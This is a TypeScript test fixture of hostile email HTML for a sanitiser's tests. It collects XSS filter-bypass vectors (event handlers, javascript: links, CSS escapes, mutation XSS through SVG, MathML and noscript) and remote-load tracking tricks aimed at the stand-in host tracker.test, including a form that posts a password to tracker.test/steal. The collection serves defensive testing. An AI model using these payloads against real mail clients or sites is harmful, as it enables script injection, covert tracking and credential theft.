// Hostile email HTML, for the sanitiser's tests and the reader's end-to-end test: script in every
// form we know of (the XSS cheat sheets' vectors, mutation XSS, SVG and MathML), everything that
// loads something (tracking pixels in src, srcset, background and CSS, fonts, style sheets, frames,
// media, prefetching), everything that sends something or moves the frame (forms, meta refresh,
// <base>, pings), and the encoding tricks used to slip any of those past a filter. `tracker.test`
// stands for a sender's server: nothing should ever reach it unless remote images are shown, and
// then only for images.

const T = 'https://tracker.test';

export const HOSTILE: Record<string, string> = {
  'script element': '<script>window.top.pwned = 1</script><p>hello</p>',
  'script with src': `<script src="${T}/x.js"></script>`,
  'script in head': `<html><head><script>parent.document.title = "pwned"</script></head><body>x</body></html>`,
  'uppercase and spaced script': '<SCRIPT >alert(1)</SCRIPT ><ScRiPt\n>alert(1)</sCrIpT>',
  'script split by null': '<scr\u0000ipt>alert(1)</scr\u0000ipt>',
  'img onerror': '<img src=x onerror="parent.pwned=1">',
  'img onerror without quotes or space': '<img/src=x/onerror=alert(1)>',
  'body onload': '<body onload="alert(1)">text</body>',
  'every handler': [
    'onclick',
    'onmouseover',
    'onfocus',
    'onblur',
    'onanimationstart',
    'ontransitionend',
    'onpointerenter',
    'onwheel',
    'onscroll',
    'onbeforetoggle',
    'ontoggle',
    'oncontentvisibilityautostatechange',
  ]
    .map((handler) => `<div ${handler}="alert(1)" tabindex="1" autofocus style="animation:x 1s">x</div>`)
    .join(''),
  'details ontoggle': '<details open ontoggle="alert(1)"><summary>s</summary>x</details>',
  'javascript link': '<a href="javascript:alert(document.domain)">click</a>',
  'javascript link, entity encoded':
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  'javascript link, hex entities without semicolons':
    '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>',
  'javascript link, tab and newline inside': '<a href="jav\tas\ncript:alert(1)">x</a>',
  'javascript link, leading control characters': '<a href="\u0001\u0002 javascript:alert(1)">x</a>',
  'vbscript link': '<a href="vbscript:msgbox(1)">x</a>',
  'data html link': '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  'link with target to the parent':
    '<a href="https://ok.test/" target="_top">x</a><a href="https://ok.test/" target="_parent">y</a>',
  'link ping': `<a href="https://ok.test/" ping="${T}/ping">x</a>`,
  'area link': `<map name="m"><area shape="rect" coords="0,0,10,10" href="${T}/area"></map><img usemap="#m" src="${T}/map.png">`,
  iframe: `<iframe src="${T}/frame"></iframe>`,
  'iframe srcdoc': '<iframe srcdoc="<script>parent.parent.pwned=1</script>"></iframe>',
  'nested frames': `<frameset><frame src="${T}/f1"><frame src="javascript:alert(1)"></frameset>`,
  'object and embed': `<object data="${T}/o.swf" type="application/x-shockwave-flash"><param name="movie" value="${T}/p.swf"></object><embed src="${T}/e.swf">`,
  applet: `<applet code="X.class" codebase="${T}/"></applet>`,
  'form post': `<form action="${T}/steal" method="post"><input name="password" type="password"><input type="submit" value="Log in"><button formaction="${T}/b">Go</button></form>`,
  'input image': `<input type="image" src="${T}/input.png">`,
  'select and textarea':
    '<select onchange="alert(1)"><option>a</option></select><textarea autofocus onfocus="alert(1)">x</textarea>',
  'meta refresh': `<meta http-equiv="refresh" content="0;url=${T}/refresh">`,
  'meta refresh in head': `<html><head><meta http-equiv="refresh" content="1; URL='${T}/refresh'"></head><body>x</body></html>`,
  'meta set-cookie and referrer': `<meta http-equiv="set-cookie" content="a=b"><meta name="referrer" content="unsafe-url"><meta http-equiv="Content-Security-Policy" content="default-src *">`,
  'base hijack': `<base href="${T}/"><a href="login">login</a><img src="pixel.gif">`,
  'base target': '<base target="_top"><a href="https://ok.test/">x</a>',
  'link stylesheet': `<link rel="stylesheet" href="${T}/s.css">`,
  'link prefetching': [
    'prefetch',
    'dns-prefetch',
    'preconnect',
    'preload',
    'prerender',
    'icon',
    'manifest',
    'modulepreload',
  ]
    .map((rel) => `<link rel="${rel}" href="${T}/${rel}">`)
    .join(''),
  'tracking pixel': `<img src="${T}/open.gif?id=123" width="1" height="1" style="display:none">`,
  'srcset tracker': `<img srcset="${T}/s1.png 1x, ${T}/s2.png 2x" src="${T}/s.png"><picture><source srcset="${T}/p.webp" type="image/webp"><img src="${T}/p.png"></picture>`,
  'background attribute': `<table background="${T}/t.png"><tr><td background="${T}/td.png">x</td></tr></table><body background="${T}/b.png">`,
  'lowsrc dynsrc longdesc': `<img lowsrc="${T}/l.png" dynsrc="${T}/d.avi" longdesc="${T}/ld" src="${T}/i.png">`,
  'video and audio': `<video src="${T}/v.mp4" poster="${T}/poster.png" autoplay></video><audio src="${T}/a.mp3" autoplay></audio><video><source src="${T}/s.mp4"><track src="${T}/t.vtt"></video>`,
  'css import': `<style>@import url(${T}/i.css); @import "${T}/j.css";</style>`,
  'css import in a media rule': `<style>@media screen { @import url(${T}/m.css); p { color: red } }</style>`,
  'css font-face': `<style>@font-face { font-family: Spy; src: url(${T}/font.woff2) format("woff2"), local(Arial) } p { font-family: Spy }</style>`,
  'css background trackers': `<style>body { background: url(${T}/bg.png) } p:hover { background-image: url("${T}/hover.png") } li { list-style: url('${T}/li.png') } a { cursor: url(${T}/c.cur), auto }</style>`,
  'css every image property': `<div style="background:url(${T}/1);border-image:url(${T}/2) 30;list-style-image:url(${T}/3);content:url(${T}/4);cursor:url(${T}/5),auto;mask-image:url(${T}/6);-webkit-mask-image:url(${T}/7);filter:url(${T}/8#f);shape-outside:url(${T}/9);mask:url(${T}/10)">x</div>`,
  'css image-set and cross-fade': `<div style="background-image:image-set('${T}/a.png' 1x, url(${T}/b.png) 2x);background:-webkit-image-set(url(${T}/c.png) 1x)">x</div><div style="background:cross-fade(url(${T}/d.png), url(${T}/e.png), 50%)">y</div>`,
  'css escapes hiding url()': `<div style="background:\\75 rl(${T}/esc1)">a</div><div style="background:u\\72l(${T}/esc2)">b</div><div style="background:\\000075\\000072\\00006c(${T}/esc3)">c</div>`,
  'css escapes hiding @import': `<style>@\\69 mport url(${T}/esc-import.css); @im\\port "${T}/x.css";</style>`,
  'css comments splitting keywords': `<style>@im/**/port url(${T}/comment.css); div{back/**/ground:u/**/rl(${T}/comment.png)}</style>`,
  'css expression and behaviour':
    '<div style="width:expression(alert(1));behavior:url(x.htc);-moz-binding:url(xbl.xml#x)">x</div><style>p{width:e\\xpression(alert(1))}</style>',
  'css javascript url':
    '<div style="background:url(javascript:alert(1))">x</div><div style="background:url(&quot;javascript:alert(1)&quot;)">y</div>',
  'css data url':
    '<div style="background:url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)">x</div>',
  'css custom properties and var()': `<style>:root{--spy:url(${T}/var.png)} body{background:var(--spy)}</style><div style="--x:url(${T}/v2.png);background:var(--x)">x</div>`,
  'css attr()':
    '<div data-u="https://tracker.test/attr.png" style="background-image:attr(data-u url)">x</div>',
  'css @namespace, @charset, @property, @counter-style': `<style>@charset "utf-8"; @namespace svg url(${T}/ns); @property --p { syntax: '<url>'; inherits: false; initial-value: url(${T}/prop.png) } @counter-style spy { system: cyclic; symbols: url(${T}/sym.png); }</style>`,
  'style element breakout':
    '<style>p{color:red}</style><style>a{content:"</style><img src=x onerror=alert(1)>"}</style>',
  'style breakout via comment': '<style>/*</style><script>alert(1)</script>*/</style>',
  'style element with markup': '<style><img src=x onerror=alert(1)></style>',
  'svg onload': '<svg onload="alert(1)"><circle r="10"/></svg>',
  'svg script': '<svg><script>alert(1)</script></svg>',
  'svg image tracker': `<svg><image href="${T}/svg.png"/><image xlink:href="${T}/svg2.png"/></svg>`,
  'svg use and animate': `<svg><use href="${T}/sprite.svg#a"/><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">x</text></a></svg>`,
  'svg foreignObject':
    '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>',
  'svg in an img': '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  mathml: '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
  'mathml mutation':
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>',
  'mathml and svg namespace confusion': '<math><mi><svg><mtext><style><img src=x onerror=alert(1)>',
  'noscript mutation': '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  'xmp mutation': '<xmp><img src=x onerror=alert(1)></xmp>',
  plaintext: '<plaintext><img src=x onerror=alert(1)>',
  'noembed and noframes':
    '<noembed><img src=x onerror=alert(1)></noembed><noframes><img src=x onerror=alert(1)></noframes>',
  template: '<template><img src=x onerror=alert(1)></template>',
  'title mutation': '<title><img src=x onerror=alert(1)></title>',
  'textarea mutation': '<textarea><img src=x onerror=alert(1)></textarea>',
  'comment mutation': '<!--><img src=x onerror=alert(1)>--><!-- --!><img src=x onerror=alert(2)> -->',
  'outlook conditional comment': `<!--[if mso]><v:rect fill="true"><v:fill type="tile" src="${T}/vml.png"/></v:rect><![endif]--><p>x</p>`,
  vml: `<v:image src="${T}/vml2.png"></v:image><o:p></o:p>`,
  'unclosed attribute': '<img src="x" alt="  onerror=alert(1) //">',
  'attribute without value breaking out': '<div title=`x`onmouseover=alert(1)>x</div>',
  'dom clobbering names':
    '<form name="body"><img name="cookie"><a id="location" href="https://ok.test/">x</a></form>',
  'unicode escapes and bidi tricks': `<a href="https://ok.test/‮gpj.exe">‮txt.exe</a><img src="${T}/​zero.png"><p>﻿zero width</p>`,
  'fullwidth and homoglyph schemes':
    '<a href="ｊａｖａｓｃｒｉｐｔ:alert(1)">x</a><a href="javascript&colon;alert(1)">y</a>',
  'utf-7 and charset tricks': '+ADw-script+AD4-alert(1)+ADw-/script+AD4-<meta charset="utf-7">',
  'null bytes and malformed tags': '<img\u0000src=x\u0000onerror=alert(1)><<script>alert(1)//<</script>',
  'portal and dialog': `<portal src="${T}/portal"></portal><dialog open><p>x</p></dialog>`,
  'marquee and blink handlers': '<marquee onstart="alert(1)">x</marquee><blink onclick=alert(1)>y</blink>',
  'isindex and keygen': `<isindex action="${T}/isindex"><keygen autofocus onfocus=alert(1)>`,
  canvas: '<canvas id="c"></canvas>',
  'embedded data uri iframe': '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
  'image map href javascript':
    '<img usemap="#x"><map name="x"><area href="javascript:alert(1)" coords="0,0,1,1"></map>',
  'object with nested html': '<object type="text/html" data="javascript:alert(1)"></object>',
  'blockquote cite': `<blockquote cite="${T}/cite">quoted</blockquote><q cite="${T}/q">q</q><del cite="${T}/d">d</del><ins cite="${T}/i">i</ins>`,
  'img with crossorigin and referrerpolicy': `<img src="${T}/c.png" crossorigin="use-credentials" referrerpolicy="unsafe-url" loading="eager" fetchpriority="high">`,
  'contenteditable and popover':
    '<div contenteditable>edit</div><button popovertarget="p">x</button><div id="p" popover>p</div>',
  'data attributes': '<div data-bind="alert(1)" data-src="https://tracker.test/data.png">x</div>',
  'xml processing instruction and cdata':
    '<?xml version="1.0"?><![CDATA[<img src=x onerror=alert(1)>]]><p>x</p>',
  'doctype and html attributes': `<!DOCTYPE html><html manifest="${T}/m.appcache" xmlns:v="urn:schemas-microsoft-com:vml"><body>x</body></html>`,
  'is attribute and slot': '<div is="x-spy" slot="s">x</div><slot name="s"></slot>',
  'link inside svg with xlink':
    '<svg><a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>',
  'formaction and form attribute': `<button form="f" formaction="${T}/fa">x</button><input form="f" formaction="${T}/fb">`,
  'srcdoc on non-iframe': '<div srcdoc="<script>alert(1)</script>">x</div>',
  'very long attribute': `<img src="${T}/${'a'.repeat(20000)}.png" alt="${'b'.repeat(20000)}">`,
};
